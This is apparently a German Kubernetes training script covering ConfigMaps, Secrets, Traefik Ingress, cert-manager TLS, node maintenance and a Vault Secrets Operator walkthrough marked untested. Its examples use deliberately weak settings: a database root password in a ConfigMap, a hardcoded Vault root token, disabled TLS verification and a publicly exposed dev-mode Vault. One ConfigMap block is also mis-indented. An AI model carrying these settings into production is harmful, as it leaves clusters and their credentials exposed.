kubectl apply -f 02-pod.yml 
```

```
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-mit-configmap -- ls -la /etc/config
kubectl exec -it pod-mit-configmap --  bash
## ls -la /etc/config 
```

### Schritt 3: Beispiel. ConfigMap als env-variablen 

```
nano 03-pod-mit-env.yml
```

```
## 03-pod-mit-env.yml 
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-env-var 
spec:
  containers:
    - name: env-var-configmap
      image: nginx:latest 
      envFrom:
        - configMapRef:
            name: example-configmap

```

```
kubectl apply -f 03-pod-mit-env.yml
```

```
## und wir schauen uns das an 
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-env-var -- env
kubectl exec -it pod-env-var --  bash
## env

```


### Reference: 

 * https://matthewpalmer.net/kubernetes-app-developer/articles/ultimate-configmap-guide-kubernetes.html

### Configmap MariaDB - Example


### Schritt 1: configmap 

```
cd 
mkdir -p manifests
cd manifests
mkdir cftest 
cd cftest 
nano 01-configmap.yml 
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: mariadb-configmap 
data:
  # als Wertepaare
  MARIADB_ROOT_PASSWORD: 11abc432
```

```
kubectl apply -f .
kubectl get cm
kubectl get cm mariadb-configmap -o yaml
```


### Schritt 2: Deployment 
```
nano 02-deploy.yml
```

```
##deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1 
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

```

```
kubectl apply -f .
```

### Important Sidenode 

  * If configmap changes, deployment does not know
  * So kubectl apply -f deploy.yml will not have any effect
  * to fix, use stakater/reloader: https://github.com/stakater/Reloader


### Configmap MariaDB my.cnf


### configmap zu fuss 

```
vi mariadb-config2.yml 
```

```
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  my.cnf: |
 [mysqld]
 slow_query_log = 1
 innodb_buffer_pool_size = 1G 
  
```

```
kubectl apply -f .
```

```
##deploy.yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

        volumeMounts:
          - name: example-configmap-volume
            mountPath: /etc/my

      volumes:
      - name: example-configmap-volume
        configMap:
          name: example-configmap
```

```
kubectl apply -f .
```

### Übung: Secrets mit secretRef - MariaDB


### Schritt 1: secret  

```
cd 
mkdir -p manifests
cd manifests
mkdir secrettest
cd secrettest 
```

```
kubectl create secret generic mariadb-secret --from-literal=MARIADB_ROOT_PASSWORD=11abc432 --dry-run=client -o yaml > 01-secrets.yml
```

```
kubectl apply -f .
kubectl get secrets 
kubectl get secrets  mariadb-secret  -o yaml
```


### Schritt 2: Deployment 
```
nano 02-deploy.yml
```

```
##deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1 
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - secretRef:
            name: mariadb-secret

```

```
kubectl apply -f .
```

### Testing 

```
## Führt den Befehl env in einem Pod des Deployments aus  
kubectl exec deployment/mariadb-deployment -- env
## eigentlich macht er das:
## kubectl exec mariadb-deployment-c6df6f959-q6swp -- env
```


### Important Sidenode 

  * If configmap changes, deployment does not know
  * So kubectl apply -f deploy.yml will not have any effect
  * to fix, use stakater/reloader: [Stakater reloader](https://github.com/stakater/Reloader)

## Kubernetes Ingress (Grundlagen)

### Hintergrund Ingress




### Ref. / Dokumentation 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

## Kubernetes Ingress (Traefik)

### Info: Traefik Ingress Controller installieren (helm)


```
helm repo add traefik https://traefik.github.io/charts

helm upgrade -n ingress --install traefik traefik/traefik --version 39.0.8 --create-namespace --skip-crds --reset-values

kubectl -n ingress get pods
kubectl -n ingress get svc
helm -n ingress status traefik 

## Use special crds helm chart instead, because it does not deploy crds for gateway-api by default
## We get an error on digitalocean doks
helm -n ingress upgrade --install traefik-crds traefik/traefik-crds --version 1.16.0 --reset-values 
```

### Übung: Ingress mit Traefik und Hostnamen


### Step 1: Walkthrough 

```
cd
mkdir -p manifests 
cd manifests
mkdir abi 
cd abi
```

```
nano apple-deploy.yml 
```

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  replicas: 1
  selector:
    matchLabels:
      app: apple
  template:
    metadata:
      labels:
        app: apple
    spec:
      containers:
        - name: web
          image: hashicorp/http-echo
          args:
            - "-text=apple-<euer-name>"
```

```
nano apple-svc.yaml
```


```
kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  type: ClusterIP
  selector:
    app: apple
  ports:
    - protocol: TCP
      port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f .
```

```
nano banana-deploy.yml
```

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  replicas: 1
  selector:
    matchLabels:
      app: banana
  template:
    metadata:
      labels:
        app: banana
    spec:
      containers:
        - name: web
          image: hashicorp/http-echo
          args:
            - "-text=banana-<euer-name>"
```

```
nano banana-svc.yaml
```

```
kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  type: ClusterIP
  selector:
    app: banana
  ports:
    - port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f .
```

### Step 2: Testing connection by podIP and Service 

```
kubectl get svc
kubectl get pods -o wide
kubectl run podtest --rm -it --image busybox
```

```
/ # wget -O - http://<pod-ip>:5678 
/ # wget -O - http://<cluster-ip>
```

### Step 3: Walkthrough 

```
nano ingress.yml
```

```
## Ingress
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: example-ingress
spec:
  ingressClassName: traefik
  rules:
  - host: "<euername>.app.do.t3isp.de"
    http:
      paths:
        - path: /apple
          backend:
            serviceName: apple-service
            servicePort: 80
        - path: /banana
          backend:
            serviceName: banana-service
            servicePort: 80
```

```
## ingress 
kubectl apply -f ingress.yml
```

### Reference 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Step 4: Find the problem 

#### Fix 4.1: Fehler: no matches kind "Ingress" in version "extensions/v1beta1"

```
## Gibt es diese Landkarte überhaupt
kubectl api-versions
## auf welcher Landkarte/Gruppe befindet sich Ingress jetzt 
kubectl explain ingress | head
## -> jetzt auf networking.k8s.io/v1 

```

```
nano ingress.yml
```

```
## auf apiVersion: extensions/v1beta1
## wird -> networking.k8s.io/v1
```

```
kubectl apply -f .
```

#### Fix 4.2: Bad Request unkown field ServiceName / ServicePort 


```
## was geht für die Property backend 
kubectl explain ingress.spec.rules.http.paths.backend
## und was geht für service
kubectl explain ingress.spec.rules.http.paths.backend.service
```

```
nano ingress.yml
```

```
## Wir ersetzen 
## serviceName: apple-service 
## durch:
## service: 
##   name: apple-service 

## das gleiche für banana 
```

```
kubectl apply -f . 
```


#### Fix 4.3. BadRequest unknown field servicePort

```
## was geht für die Property backend 
kubectl explain ingress.spec.rules.http.paths.backend
## und was geht für service
kubectl explain ingress.spec.rules.http.paths.backend.service
## number 
kubectl explain ingress.spec.rules.http.paths.backend.service.port
```

```
## neue Variante sieht so aus
backend:
  service:
    name: apple-service
    port:
      number: 80
## das gleich für banana-service
```

```
kubectl apply -f .
```


#### Fix 4.4. pathType must be specificied 

```
## Was macht das ?
kubectl explain ingress.spec.rules.http.paths.pathType
```

```
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Exact 
          backend:
            service:
              name: banana-service
              port:
                number: 80                
```

```
kubectl apply -f .
```

### Step 5: bereits fertige Lösung 

```
nano ingress.yml
```

```
## Ingress
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
spec:
  ingressClassName: traefik
  rules:
  - host: "<euername>.appv2.do.t3isp.de"
    http:
      paths:
        - path: /apple
          pathType: Exact
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Prefix 
          backend:
            service:
              name: banana-service
              port:
                number: 80
```

```
## ingress 
kubectl apply -f ingress.yml
kubectl describe ingress 
```

### Step 6: Testing 

```
## mit describe herausfinden, ob er die services gefunden hat
kubectl describe ingress example-ingress
```

```
## Im Browser auf:
## hier euer Name 
http://jochen.appv2.do.t3isp.de/apple
http://jochen.appv2.do.t3isp.de/apple/
http://jochen.appv2.do.t3isp.de/apple/foo 
http://jochen.appv2.do.t3isp.de/banana
## geht nicht 
http://jochen.appv2.do.t3isp.de/banana/nix
```

### Übung: HTTPS/TLS mit Let's Encrypt - cert-manager


### Prerequisites 

  * abi-projekt muss existieren

### Trainer: Schritt 1: cert-manager installieren 

```
helm repo add jetstack https://charts.jetstack.io
helm upgrade --install cert-manager jetstack/cert-manager \
--namespace cert-manager --create-namespace \
--version v1.19.2 \
--set crds.enabled=true \
--reset-values
```

  * Ref: https://artifacthub.io/packages/helm/cert-manager/cert-manager

### Trainer: Schritt 2: Create ClusterIssuer (gets certificates from Letsencrypt)

```
cd
mkdir -p manifests/cert-manager
cd manifests/cert-manager
nano cluster-issuer.yaml
```



```
## cluster-issuer.yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    server: https://acme-v02.api.letsencrypt.org/directory
    # Email-Adresse ändern - example.com ist nicht erlaubt 
    email: your-email@example.com
    privateKeySecretRef:
      name: letsencrypt-prod
    solvers:
    - http01:
        ingress:
          class: traefik
```

```
kubectl apply -f .
## Should be True 
kubectl get clusterissuer 
```


### Schritt 3: Ingress-Objekt mit TLS erstellen 

```
cd
cd manifests/abi
```

```
nano ingress.yml
```

```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
spec:
  ingressClassName: traefik
  tls:
  - hosts:
    - <dein-name>.appv2.do.t3isp.de
    secretName: example-tls

  rules:
  - host: "<dein-name>.appv2.do.t3isp.de"
    http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Exact
          backend:
            service:
              name: banana-service
              port:
                number: 80
```

```
kubectl apply -f .
```

### Schritt 4: Herausfinden, ob Zertifikate erstellt werden 

```
kubectl describe certificate example-tls
```
```
## muss auf True stehen 
kubectl get cert
```

```
## Certificate Request 
kubectl get cr
## da ist das Zertfikat drin 
kubectl get secret example-tls
kubectl get orders 
```

#### Debugging 

  * Solange das Zertifikat nicht bestätigt bei der ACME-Anfrage (Challenge), seht ihr das noch unter

```
kubectl get challenges
```

#### Verschlüsselungstiefe erhöhen

  * Standardmäßig 2048bit

```
    # Hier legst du die Verschlüsselungstiefe fest
    cert-manager.io/private-key-algorithm: "RSA"
    cert-manager.io/private-key-size: "4096"

```


### Schritt 5: Testen

   * Aufruf der Subdomain im Browser (mit https): z.B. https://jochen.app.do.t3isp.de/banana

### Ref: 

  * https://hbayraktar.medium.com/installing-cert-manager-and-nginx-ingress-with-lets-encrypt-on-kubernetes-fe0dff4b1924

## Kubernetes - Wartung / Debugging 

### kubectl drain/uncordon


```
## Achtung, bitte keine pods verwenden, dies können "ge"-drained (ausgetrocknet) werden 
kubectl drain <node-name>
z.B. 
## Daemonsets ignorieren, da diese nicht gelöscht werden 
kubectl drain n17 --ignore-daemonsets 

## Alle pods von replicasets werden jetzt auf andere nodes verschoben 
## Ich kann jetzt wartungsarbeiten durchführen 

## Wenn fertig bin:
kubectl uncordon n17 

## Achtung: deployments werden nicht neu ausgerollt, dass muss ich anstossen.
## z.B. 
kubectl rollout restart deploy/webserver 


```

### Alte manifeste konvertieren mit convert plugin


### What is about? 

  * Plugins needs to be installed seperately on Client (or where you have your manifests) 

### Walkthrough 

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl-convert"
## Validate the checksum
curl -LO "https://dl.k8s.io/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl-convert.sha256"
echo "$(<kubectl-convert.sha256) kubectl-convert" | sha256sum --check
## install 
sudo install -o root -g root -m 0755 kubectl-convert /usr/local/bin/kubectl-convert

## Does it work 
kubectl convert --help 

## Works like so 
## Convert to the newest version 
## kubectl convert -f pod.yaml

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-convert-plugin 

### Netzwerkverbindung zu pod testen


### Situation 

```
Managed Cluster und ich kann nicht auf einzelne Nodes per ssh zugreifen
```

### Behelf: Eigenen Pod starten mit busybox 

```
kubectl run podtest --rm -ti --image busybox -- /bin/sh
```

### Example test connection 

```
## wget befehl zum Kopieren
wget -O - http://10.244.0.99
```

```
## -O -> Output (grosses O (buchstabe)) 
kubectl run podtest --rm -ti --image busybox -- /bin/sh
/ # wget -O - http://10.244.0.99
/ # exit 
```

### Curl from pod api-server


https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c

## Kubernetes - Secrets Management (Hashicorp Vault / OpenBao)

### Überblick Hashicorp Vault (VSO, Sidecar, Volumes)


### Zentrale Externer Server mit 3 Nodes (Produktion) 

### 3-Wege für Kubernetes Daten zu bekommen 

  * VSO (Vault Secrets Operator)
  * SideCar Injection
  * Volumes 

### VSO 

  * Ich bestücke eine neue CRT mit dem Wunsch eines Credentials "Vault Static Secret"

```
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
  name: webapp-config
  namespace: default
spec:
  # Reference to VaultAuth in another namespace
  vaultAuthRef: vault-secrets-operator-system/default
  
  # Vault mount path (where the secret engine is mounted)
  mount: secret
  
  # Path to the secret within the mount
  path: webapp/config
  
  # Type of secret engine
  type: kv-v2
  
  # Destination Kubernetes secret configuration
  destination:
    create: true
    name: webapp-secret
    type: Opaque
  
  # How often to refresh the secret from Vault
  refreshAfter: 30s
```

#### Nachteil 

  * Das automatisch erstellte Secret wird in etc gespeichert, solange wie das VaultStaticSecret existiert


### Vault Sidecar Injector 

#### Vorteile 

  * Sicherste Variante
  * Es wird kein Secret erstellt, passwort wird direkt im Pod zur Verfügung gestellt (in einer Datei)

#### Nachteile

  * Relativ viele Einträge im Pod über Annotations zu machen, damit das funktioniert
  * Overhead über SideCar (weil jeder Pod ein Sidecar bekommt)
  * Bekommt mit, wenn sich das Passwort ändert 

### Volumes 

### Übung: Vault Secrets Operator (VSO) mit Kubernetes


### Untested ! 

## Complete HashiCorp Vault Setup Exercise with Kubernetes, Helm, and Vault Secrets Operator

### Step 1: Create Project Structure

```bash
## Create the project directory
cd ~
mkdir -p vault-k8s-exercise
cd vault-k8s-exercise

## Create organized directory structure
mkdir -p manifests/vault
mkdir -p manifests/vault-secrets-operator
mkdir -p manifests/applications
mkdir -p scripts

## Navigate to the main directory
cd manifests/vault
```

### Step 2: Create Vault Development Configuration

```bash
nano vault-dev-values.yaml
```

**File content for `vault-dev-values.yaml`:**
```yaml
## vault-dev-values.yaml
global:
  enabled: true

server:
  # Development mode - DO NOT use in production
  dev:
    enabled: true
    devRootToken: "myroot"
  
  # Use standalone mode for development
  standalone:
    enabled: true
  
  # Disable high availability for dev
  ha:
    enabled: false
  
  # Resource limits for development
  resources:
    requests:
      memory: 256Mi
      cpu: 250m
    limits:
      memory: 512Mi
      cpu: 500m
  
  # LoadBalancer service configuration
  service:
    enabled: true
    type: LoadBalancer
    port: 8200
    # Optional: restrict access to internal networks
    loadBalancerSourceRanges:
      - "10.0.0.0/8"
      - "192.168.0.0/16"
      - "172.16.0.0/12"

## Enable Vault UI with LoadBalancer
ui:
  enabled: true
  serviceType: "LoadBalancer"
  
## Disable injector for this exercise
injector:
  enabled: false

## Server affinity (optional, for node selection)
serverTelemetry:
  prometheusOperator: false
```

### Step 3: Add HashiCorp Helm Repository and Install Vault

```bash
## Add HashiCorp Helm repository
helm repo add hashicorp https://helm.releases.hashicorp.com
helm repo update

## Create vault namespace
kubectl create namespace vault

## Install Vault using our configuration
helm install vault hashicorp/vault \
  --namespace vault \
  --values vault-dev-values.yaml

## Wait for deployment to be ready
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=vault -n vault --timeout=300s
```

### Step 4: Verify Vault Installation

```bash
## Check vault pods
kubectl get pods -n vault

## Check vault service and get external IP
kubectl get svc -n vault

## Wait for external IP assignment
echo "Waiting for LoadBalancer IP assignment..."
kubectl get svc vault -n vault -w
```

### Step 5: Create Vault Access Script

```bash
cd ../../scripts
nano vault-access.sh
```

**File content for `vault-access.sh`:**
```bash
##!/bin/bash

## Get Vault external IP
VAULT_EXTERNAL_IP=$(kubectl get svc vault -n vault -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

if [ -z "$VAULT_EXTERNAL_IP" ]; then
    echo "LoadBalancer IP not yet assigned. Checking for hostname..."
    VAULT_EXTERNAL_IP=$(kubectl get svc vault -n vault -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
fi

if [ -z "$VAULT_EXTERNAL_IP" ]; then
    echo "External IP/Hostname not available. Using port-forward instead..."
    echo "Run: kubectl port-forward -n vault svc/vault 8200:8200"
    export VAULT_ADDR=http://localhost:8200
else
    echo "Vault External IP/Hostname: $VAULT_EXTERNAL_IP"
    export VAULT_ADDR=http://$VAULT_EXTERNAL_IP:8200
fi

export VAULT_TOKEN=myroot

echo "Vault Address: $VAULT_ADDR"
echo "Vault Token: $VAULT_TOKEN"
echo ""
echo "Testing Vault connection..."
vault status

echo ""
echo "Vault UI available at: $VAULT_ADDR"
echo "Login with token: $VAULT_TOKEN"
```

```bash
## Make script executable
chmod +x vault-access.sh

## Run the script to test Vault access
./vault-access.sh
```

### Step 6: Configure Vault Secrets

```bash
nano vault-setup.sh
```

**File content for `vault-setup.sh`:**
```bash
##!/bin/bash

## Source the access script
source ./vault-access.sh

echo "Setting up Vault secrets..."

## Enable KV secrets engine
vault secrets enable -path=secret kv-v2

## Create application secrets
vault kv put secret/webapp/config \
  username="admin" \
  password="supersecret123" \
  api_key="abc123xyz" \
  database_url="postgresql://user:pass@db:5432/webapp"

vault kv put secret/webapp/database \
  host="postgres.default.svc.cluster.local" \
  port="5432" \
  username="webapp_user" \
  password="db_password_123"

## Create API secrets
vault kv put secret/api/tokens \
  github_token="ghp_xxxxxxxxxxxx" \
  slack_webhook="https://hooks.slack.com/services/xxx" \
  jwt_secret="my-super-secret-jwt-key"

echo "Vault secrets created successfully!"
echo ""
echo "You can verify by running:"
echo "vault kv get secret/webapp/config"
echo "vault kv get secret/webapp/database"
echo "vault kv get secret/api/tokens"
```

```bash
## Make script executable and run it
chmod +x vault-setup.sh
./vault-setup.sh
```

### Step 7: Install Vault Secrets Operator

```bash
cd ../manifests/vault-secrets-operator
nano vso-installation.yaml
```

**File content for `vso-installation.yaml`:**
```yaml
## This file documents the VSO installation
## Run the following commands to install:

## helm install vault-secrets-operator hashicorp/vault-secrets-operator \
##   --namespace vault-secrets-operator-system \
##   --create-namespace \
##   --set "defaultVaultConnection.enabled=true" \
##   --set "defaultVaultConnection.address=http://vault.vault.svc.cluster.local:8200" \
##   --set "defaultVaultConnection.skipTLSVerify=true"
```

```bash
## Install Vault Secrets Operator
helm install vault-secrets-operator hashicorp/vault-secrets-operator \
  --namespace vault-secrets-operator-system \
  --create-namespace

## Wait for VSO to be ready
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=vault-secrets-operator -n vault-secrets-operator-system --timeout=300s
```

### Step 8: Configure Vault Connection for VSO

```bash
nano vault-connection.yaml
```

**File content for `vault-connection.yaml`:**
```yaml
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultConnection
metadata:
  namespace: vault-secrets-operator-system
  name: default
spec:
  # Use internal service address
  address: http://vault.vault.svc.cluster.local:8200
  
  # Skip TLS verification for dev mode
  skipTLSVerify: true
---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultAuth
metadata:
  namespace: vault-secrets-operator-system
  name: default
spec:
  vaultConnectionRef: default
  method: token
  token:
    # Reference to secret containing the root token
    secretRef:
      name: vault-token
      key: token
---
apiVersion: v1
kind: Secret
metadata:
  namespace: vault-secrets-operator-system
  name: vault-token
type: Opaque
data:
  # Base64 encoded "myroot"
  token: bXlyb290
```

```bash
## Apply the Vault connection configuration
kubectl apply -f vault-connection.yaml

## Verify the connection
kubectl get vaultconnection -n vault-secrets-operator-system
kubectl get vaultauth -n vault-secrets-operator-system
```

### Step 9: Create VaultStaticSecret Resources

```bash
nano webapp-vault-secrets.yaml
```

**File content for `webapp-vault-secrets.yaml`:**
```yaml
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
  name: webapp-config
  namespace: default
spec:
  vaultAuthRef: vault-secrets-operator-system/default
  
  # Mount path in Vault
  mount: secret
  
  # Path to the secret
  path: webapp/config
  
  # Secret type
  type: kv-v2
  
  # Kubernetes secret to create
  destination:
    create: true
    name: webapp-secret
    type: Opaque
  
  # Refresh interval
  refreshAfter: 30s
  
  # Rollout restart for deployments using this secret
  rolloutRestartTargets:
    - kind: Deployment
      name: webapp
---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
  name: webapp-database
  namespace: default
spec:
  vaultAuthRef: vault-secrets-operator-system/default
  
  mount: secret
  path: webapp/database
  type: kv-v2
  
  destination:
    create: true
    name: webapp-db-secret
    type: Opaque
  
  refreshAfter: 30s
  
  rolloutRestartTargets:
    - kind: Deployment
      name: webapp
---
apiVersion: secrets.hashicorp.com/v1beta1
kind: VaultStaticSecret
metadata:
  name: api-tokens
  namespace: default
spec:
  vaultAuthRef: vault-secrets-operator-system/default
  
  mount: secret
  path: api/tokens
  type: kv-v2
  
  destination:
    create: true
    name: api-tokens-secret
    type: Opaque
  
  refreshAfter: 30s
```

```bash
## Apply the VaultStaticSecret resources
kubectl apply -f webapp-vault-secrets.yaml

## Check the status of VaultStaticSecrets
kubectl get vaultstaticsecret
kubectl describe vaultstaticsecret webapp-config
```

### Step 10: Create Sample Application

```bash
cd ../applications
nano webapp-deployment.yaml
```

**File content for `webapp-deployment.yaml`:**
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webapp
  labels:
    app: webapp
spec:
  replicas: 2
  selector:
    matchLabels:
      app: webapp
  template:
    metadata:
      labels:
        app: webapp
    spec:
      containers:
      - name: webapp
        image: nginx:alpine
        ports:
        - containerPort: 80
        
        # Environment variables from Vault secrets
        env:
        - name: APP_USERNAME
          valueFrom:
            secretKeyRef:
              name: webapp-secret
              key: username
        - name: APP_PASSWORD
          valueFrom:
            secretKeyRef:
              name: webapp-secret
              key: password
        - name: API_KEY
          valueFrom:
            secretKeyRef:
              name: webapp-secret
              key: api_key
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: webapp-secret
              key: database_url
        - name: DB_HOST
          valueFrom:
            secretKeyRef:
              name: webapp-db-secret
              key: host
        - name: DB_USERNAME
          valueFrom:
            secretKeyRef:
              name: webapp-db-secret
              key: username
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: webapp-db-secret
              key: password
        - name: GITHUB_TOKEN
          valueFrom:
            secretKeyRef:
              name: api-tokens-secret
              key: github_token
        
        # Mount secrets as files
        volumeMounts:
        - name: app-secrets
          mountPath: /etc/secrets/app
          readOnly: true
        - name: db-secrets
          mountPath: /etc/secrets/db
          readOnly: true
        - name: api-secrets
          mountPath: /etc/secrets/api
          readOnly: true
        
        # Custom nginx config to display environment variables
        - name: nginx-config
          mountPath: /etc/nginx/conf.d
          
      volumes:
      - name: app-secrets
        secret:
          secretName: webapp-secret
      - name: db-secrets
        secret:
          secretName: webapp-db-secret
      - name: api-secrets
        secret:
          secretName: api-tokens-secret
      - name: nginx-config
        configMap:
          name: nginx-config
---
apiVersion: v1
kind: Service
metadata:
  name: webapp-service
spec:
  type: LoadBalancer
  selector:
    app: webapp
  ports:
  - port: 80
    targetPort: 80
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: nginx-config
data:
  default.conf: |
    server {
        listen 80;
        server_name localhost;
        
        location / {
            root /usr/share/nginx/html;
            index index.html;
        }
        
        location /health {
            access_log off;
            return 200 "healthy\n";
            add_header Content-Type text/plain;
        }
        
        location /env {
            add_header Content-Type text/plain;
            return 200 "Environment Variables loaded from Vault secrets\n";
        }
    }
```

```bash
## Apply the application
kubectl apply -f webapp-deployment.yaml

## Wait for deployment to be ready
kubectl wait --for=condition=available deployment/webapp --timeout=300s
```

### Step 11: Create Verification Script

```bash
cd ../../scripts
nano verify-setup.sh
```

**File content for `verify-setup.sh`:**
```bash
##!/bin/bash

echo "=== Vault Kubernetes Exercise Verification ==="
echo ""

echo "1. Checking Vault pods..."
kubectl get pods -n vault
echo ""

echo "2. Checking Vault service..."
kubectl get svc -n vault
echo ""

echo "3. Checking Vault Secrets Operator..."
kubectl get pods -n vault-secrets-operator-system
echo ""

echo "4. Checking VaultConnection and VaultAuth..."
kubectl get vaultconnection,vaultauth -n vault-secrets-operator-system
echo ""

echo "5. Checking VaultStaticSecrets..."
kubectl get vaultstaticsecret
echo ""

echo "6. Checking generated Kubernetes secrets..."
kubectl get secrets | grep -E "(webapp-secret|webapp-db-secret|api-tokens-secret)"
echo ""

echo "7. Checking webapp deployment..."
kubectl get deployment webapp
kubectl get pods -l app=webapp
echo ""

echo "8. Checking webapp service..."
kubectl get svc webapp-service
echo ""

echo "9. Getting secret contents (base64 decoded)..."
echo "webapp-secret:"
kubectl get secret webapp-secret -o jsonpath='{.data.username}' | base64 -d && echo ""
kubectl get secret webapp-secret -o jsonpath='{.data.api_key}' | base64 -d && echo ""
echo ""

echo "webapp-db-secret:"
kubectl get secret webapp-db-secret -o jsonpath='{.data.host}' | base64 -d && echo ""
kubectl get secret webapp-db-secret -o jsonpath='{.data.username}' | base64 -d && echo ""
echo ""

echo "10. Testing Vault access..."
source ./vault-access.sh > /dev/null 2>&1
echo "Vault status:"
vault status
echo ""

echo "11. Listing Vault secrets..."
vault kv list secret/
echo ""

echo "=== Verification Complete ==="
echo ""
echo "Next steps:"
echo "- Access Vault UI at: $VAULT_ADDR (token: myroot)"
echo "- Check webapp service external IP: kubectl get svc webapp-service"
echo "- View pod logs: kubectl logs -l app=webapp"
echo "- Test secret rotation: Update secrets in Vault and watch pods restart"
```

```bash
## Make script executable and run verification
chmod +x verify-setup.sh
./verify-setup.sh
```

### Step 12: Create Cleanup Script

```bash
nano cleanup.sh
```

**File content for `cleanup.sh`:**
```bash
##!/bin/bash

echo "Cleaning up Vault Kubernetes Exercise..."

## Delete application
kubectl delete -f ../manifests/applications/webapp-deployment.yaml --ignore-not-found

## Delete VaultStaticSecrets
kubectl delete -f ../manifests/vault-secrets-operator/webapp-vault-secrets.yaml --ignore-not-found

## Delete Vault connection
kubectl delete -f ../manifests/vault-secrets-operator/vault-connection.yaml --ignore-not-found

## Uninstall Vault Secrets Operator
helm uninstall vault-secrets-operator -n vault-secrets-operator-system --ignore-not-found

## Delete VSO namespace
kubectl delete namespace vault-secrets-operator-system --ignore-not-found

## Uninstall Vault
helm uninstall vault -n vault --ignore-not-found

## Delete Vault namespace
kubectl delete namespace vault --ignore-not-found

echo "Cleanup complete!"
```

```bash
chmod +x cleanup.sh
```

### Step 13: Create README

```bash
cd ..
nano README.md
```

**File content for `README.md`:**
```markdown
## HashiCorp Vault with Kubernetes Exercise

This exercise demonstrates setting up HashiCorp Vault in development mode on Kubernetes using Helm and the Vault Secrets Operator (VSO).

### Project Structure

```
vault-k8s-exercise/
├── manifests/
│   ├── vault/
│   │   └── vault-dev-values.yaml
│   ├── vault-secrets-operator/
│   │   ├── vso-installation.yaml
│   │   ├── vault-connection.yaml
│   │   └── webapp-vault-secrets.yaml
│   └── applications/
│       └── webapp-deployment.yaml
├── scripts/
│   ├── vault-access.sh
│   ├── vault-setup.sh
│   ├── verify-setup.sh
│   └── cleanup.sh
└── README.md
```

### Prerequisites

- Kubernetes cluster with LoadBalancer support
- Helm 3.x installed
- kubectl configured
- vault CLI (optional, for testing)

### Quick Start

1. Run the verification script:
   ```bash
   cd scripts
   ./verify-setup.sh
   ```

2. Access Vault UI using the external LoadBalancer IP
3. Login with token: `myroot`

### Key Components

- **Vault**: Running in development mode with LoadBalancer service
- **Vault Secrets Operator**: Manages secrets synchronization
- **VaultStaticSecret**: CRDs that sync Vault secrets to Kubernetes secrets
- **Sample Application**: Nginx deployment using secrets from Vault

### Important Notes

- This is a **DEVELOPMENT** setup only
- Never use development mode in production
- Secrets are not persisted (stored in memory)
- TLS is disabled for simplicity

### Cleanup

To remove all resources:
```bash
cd scripts
./cleanup.sh
```
```

### Final Verification

```bash
## Navigate back to project root
cd ~/vault-k8s-exercise

## Run final verification
cd scripts
./verify-setup.sh

## Check the complete project structure
cd ..
find . -type f -name "*.yaml" -o -name "*.sh" -o -name "*.md" | sort
```

### Summary

You now have a complete HashiCorp Vault setup with:

1. ✅ **Vault** running in development mode with LoadBalancer access
2. ✅ **Vault Secrets Operator** managing secret synchronization
3. ✅ **VaultStaticSecret** resources creating Kubernetes secrets from Vault
4. ✅ **Sample application** using secrets from Vault
5. ✅ **Scripts** for setup, verification, and cleanup
6. ✅ **Organized project structure** with proper documentation

